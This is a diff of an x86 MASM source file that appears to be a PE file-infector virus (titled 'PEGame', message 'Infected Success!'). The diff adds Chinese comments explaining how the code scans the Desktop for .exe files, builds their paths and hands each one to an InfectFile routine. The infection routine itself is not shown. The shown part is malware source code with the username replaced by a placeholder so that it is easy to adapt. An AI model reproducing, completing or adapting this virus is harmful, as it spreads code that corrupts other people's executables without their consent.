@@ -9,38 +9,41 @@ include         user32.inc
 includelib      user32.lib
 
 @pushsz MACRO  str
-	LOCAL next
-	call  next
-	db    str,0
+	LOCAL  next
+	call   next
+	db     str,0
 	next:
 ENDM
 
 PEGame SEGMENT 
 fd WIN32_FIND_DATA <>
-Dsektop   db 'C:/Users/vt/Desktop/',0
+Dsektop   db 'C:/Users/XXX/Desktop/',0       ;修改对应desktop的路径
 dot       db '.',0 
 FilePath  db 260 dup(?);  
 handle    dd 0
-sPath     db 'C:/Users/vt/Desktop/*.exe',0
+sPath     db 'C:/Users/XXX/Desktop/*.exe',0  ;修改对应desktop的路径
 sTitle    db 'By Alex', 0
 sMessage  db 'Infected Success!',0
 
 start:
+;**********************************************************
+;磁盘搜索
+;**********************************************************
         invoke  FindFirstFileA,offset sPath,offset fd
         mov handle, eax
         cmp handle, INVALID_HANDLE_VALUE
         jz	Exit0
 Check:
-        invoke  lstrcmp,offset dot,offset fd.cFileName[0]
+        invoke  lstrcmp,offset dot,offset fd.cFileName[0]   ;排除.和..文件夹
         jz	FindNextDir
-        and fd.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
+        and fd.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY   ;如果遍历的为文件夹，则继续遍历
         jnz	start
         invoke  lstrcpy,offset FilePath,offset Dsektop
         cmp eax, 0
         jz  Exit0
-        invoke  lstrcat,offset FilePath,offset fd.cFileName
+        invoke  lstrcat,offset FilePath,offset fd.cFileName ;遍历完将文件名和路径拼接在一起
         push    offset FilePath
-        call    InfectFile
+        call    InfectFile                                  ;将文件路径传入函数，开始感染文件
         invoke  RtlZeroMemory,offset FilePath,260
         invoke  lstrcpy,offset FilePath,offset Dsektop
 FindNextDir:
